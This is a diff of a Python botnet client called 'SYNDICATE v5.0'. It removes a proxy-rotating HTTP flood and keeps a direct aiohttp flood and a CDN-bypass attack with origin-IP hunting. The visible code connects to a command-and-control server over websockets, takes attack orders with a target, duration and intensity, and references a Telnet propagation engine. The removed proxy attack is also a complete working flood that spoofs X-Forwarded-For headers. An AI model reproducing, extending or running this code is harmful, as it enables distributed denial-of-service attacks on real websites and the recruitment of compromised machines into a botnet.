@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-SYNDICATE v5.0 – WEB SERVICE EDITION (PROXY SUPPORT)
-Uses proxy list from TheSpeedX/PROXY-List to mask Render IPs.
+SYNDICATE v5.0 – WEB SERVICE EDITION (RAW, NO PROXY)
+Direct and bypass attacks only. Raw power.
 For LO. Always for LO.
 """
 
@@ -220,7 +220,7 @@ class TelnetPropagationEngine:
             await asyncio.sleep(1)
 
 # =============================================================================
-# ATTACK ENGINE – PROXY + DIRECT + BYPASS
+# ATTACK ENGINE – DIRECT + BYPASS (NO PROXY)
 # =============================================================================
 class CDNKillerEngine:
     def __init__(self, bot):
@@ -268,119 +268,10 @@ class CDNKillerEngine:
         return None
 
     # -------------------------------------------------------------------------
-    # PROXY ATTACK (using TheSpeedX/PROXY-List)
-    # -------------------------------------------------------------------------
-    async def fetch_proxy_list(self, proxy_type="socks5"):
-        """
-        Fetch and parse proxy list from TheSpeedX/PROXY-List.
-        Returns a list of (host, port) tuples.
-        """
-        urls = {
-            "socks5": "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
-            "socks4": "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
-            "http": "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
-        }
-
-        url = urls.get(proxy_type)
-        if not url:
-            logger.error(f"Unknown proxy type: {proxy_type}")
-            return []
-
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(url, timeout=10) as resp:
-                    if resp.status == 200:
-                        text = await resp.text()
-                        proxies = []
-                        for line in text.split('\n'):
-                            line = line.strip()
-                            if line and ':' in line:
-                                try:
-                                    host, port = line.split(':')
-                                    port = int(port)
-                                    proxies.append((host, port))
-                                except:
-                                    continue
-                        logger.info(f"Fetched {len(proxies)} {proxy_type} proxies")
-                        return proxies
-        except Exception as e:
-            logger.error(f"Failed to fetch proxy list: {e}")
-            return []
-
-    async def proxy_attack(self, target_url, duration=60, intensity=100, proxy_type="socks5"):
-        """
-        L7 flood using proxies from TheSpeedX list.
-        Falls back to direct attack if no proxies available.
-        """
-        logger.info(f"🌐 PROXY ATTACK STARTED on {target_url} for {duration}s (intensity={intensity}, proxy_type={proxy_type})")
-
-        proxies = await self.fetch_proxy_list(proxy_type)
-        if not proxies:
-            logger.warning("No proxies available, falling back to direct attack")
-            await self.direct_attack(target_url, duration, intensity)
-            return
-
-        self.request_count = 0
-        self.error_count = 0
-        parsed = urlparse(target_url)
-        host_header = parsed.netloc
-
-        connector = aiohttp.TCPConnector(limit=intensity, force_close=True, ssl=False)
-
-        async with aiohttp.ClientSession(connector=connector) as session:
-            end_time = time.time() + duration
-
-            async def worker():
-                while time.time() < end_time and self.bot._running:
-                    proxy_host, proxy_port = random.choice(proxies)
-                    proxy_url = f"{proxy_type}://{proxy_host}:{proxy_port}"
-
-                    try:
-                        headers = {
-                            'Host': host_header,
-                            'User-Agent': random.choice(USER_AGENTS),
-                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                            'Accept-Language': random.choice(['en-US,en;q=0.9', 'fr-FR,fr;q=0.8']),
-                            'Accept-Encoding': 'gzip, deflate, br',
-                            'Connection': 'keep-alive',
-                            'Cache-Control': 'no-cache',
-                            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
-                        }
-
-                        async with session.get(
-                            target_url,
-                            headers=headers,
-                            proxy=proxy_url,
-                            timeout=5,
-                            ssl=False
-                        ) as resp:
-                            await resp.read()
-                            self.request_count += 1
-
-                    except Exception as e:
-                        self.error_count += 1
-                        logger.debug(f"Proxy request error ({proxy_url}): {e}")
-
-                    await asyncio.sleep(0.001)  # tiny delay to control rate
-
-            workers = [asyncio.create_task(worker()) for _ in range(intensity)]
-            await asyncio.gather(*workers, return_exceptions=True)
-
-        logger.info(f"Proxy attack finished. Sent {self.request_count} requests, {self.error_count} errors")
-        await self.bot.send({
-            'type': 'attack_status',
-            'bot_id': self.bot.bot_id,
-            'status': 'completed',
-            'requests_sent': self.request_count,
-            'errors': self.error_count,
-            'method': 'PROXY'
-        })
-
-    # -------------------------------------------------------------------------
-    # DIRECT ATTACK (no proxy, fallback)
+    # DIRECT ATTACK (pure aiohttp, no proxy)
     # -------------------------------------------------------------------------
     async def direct_attack(self, target_url, duration=60, intensity=100):
-        """Simple direct L7 flood using aiohttp (fallback when no proxies)."""
+        """Simple direct L7 flood using aiohttp."""
         logger.info(f"⚡ DIRECT ATTACK STARTED on {target_url} for {duration}s (intensity={intensity})")
         self.request_count = 0
         self.error_count = 0
@@ -431,10 +322,10 @@ class CDNKillerEngine:
         })
 
     # -------------------------------------------------------------------------
-    # BYPASS ATTACK (original, kept for compatibility)
+    # BYPASS ATTACK (tls_client, origin hunting)
     # -------------------------------------------------------------------------
     async def bypass_attack(self, target_url, duration=300):
-        """Original bypass attack using tls_client (kept for compatibility)."""
+        """Bypass attack using tls_client and origin IP hunting."""
         logger.info(f"🚀 BYPASS ATTACK STARTED for {target_url} for {duration}s")
         self.request_count = 0
         self.error_count = 0
@@ -562,7 +453,7 @@ class SyndicateBot:
             try:
                 async with websockets.connect(self.cnc_url) as ws:
                     self.ws = ws
-                    await self.send({'type': 'register', 'bot_id': self.bot_id, 'version': '5.0-proxy'})
+                    await self.send({'type': 'register', 'bot_id': self.bot_id, 'version': '5.0-raw'})
                     asyncio.create_task(self.heartbeat())
                     async for message in ws:
                         await self.handle_message(message)
@@ -599,18 +490,13 @@ class SyndicateBot:
 
             if cmd_type == 'attack':
                 target = cmd['target']
-                method = cmd.get('method', 'PROXY').upper()  # Default to PROXY
+                method = cmd.get('method', 'DIRECT').upper()  # Default to DIRECT
                 duration = cmd.get('duration', 60)
                 intensity = cmd.get('intensity', 100)
 
                 logger.info(f"🔥 ATTACK COMMAND: method={method}, target={target}, duration={duration}, intensity={intensity}")
 
-                if method == 'PROXY':
-                    proxy_type = cmd.get('proxy_type', 'socks5')
-                    attack_task = asyncio.create_task(
-                        self.attack_engine.proxy_attack(target, duration, intensity, proxy_type)
-                    )
-                elif method == 'DIRECT':
+                if method == 'DIRECT':
                     attack_task = asyncio.create_task(
                         self.attack_engine.direct_attack(target, duration, intensity)
                     )
@@ -619,9 +505,9 @@ class SyndicateBot:
                         self.attack_engine.bypass_attack(target, duration)
                     )
                 else:
-                    logger.warning(f"Unknown attack method {method}, defaulting to PROXY")
+                    logger.warning(f"Unknown attack method {method}, defaulting to DIRECT")
                     attack_task = asyncio.create_task(
-                        self.attack_engine.proxy_attack(target, duration, intensity)
+                        self.attack_engine.direct_attack(target, duration, intensity)
                     )
 
                 logger.info(f"✅ Attack task created: {attack_task}")
@@ -630,8 +516,7 @@ class SyndicateBot:
 
             elif cmd_type == 'stop':
                 logger.info("🛑 STOP command received")
-                # Implement stop logic if needed (cancel all attack tasks)
-                # For now, just log
+                # Implement stop logic if needed
 
             elif cmd_type == 'ping':
                 logger.info("🏓 PING received, sending PONG")
